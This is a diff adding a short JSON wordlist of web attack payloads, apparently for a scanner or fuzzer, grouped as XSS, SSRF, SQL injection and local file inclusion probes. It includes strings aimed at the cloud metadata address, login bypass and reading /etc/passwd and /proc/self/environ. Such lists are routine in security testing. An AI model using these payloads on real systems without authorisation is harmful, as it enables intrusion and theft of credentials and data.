@@ -1,0 +1,22 @@
+{
+  "XSS": [
+    "<script>alert(1)</script>",
+    "\"><img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>"
+  ],
+  "SSRF": [
+    "http://127.0.0.1",
+    "http://169.254.169.254",
+    "http://localhost/admin"
+  ],
+  "SQLi": [
+    "' OR '1'='1",
+    "' UNION SELECT NULL--",
+    "admin' --"
+  ],
+  "LFI": [
+    "../../etc/passwd",
+    "../../../../../../../../etc/hosts",
+    "/proc/self/environ"
+  ]
+}
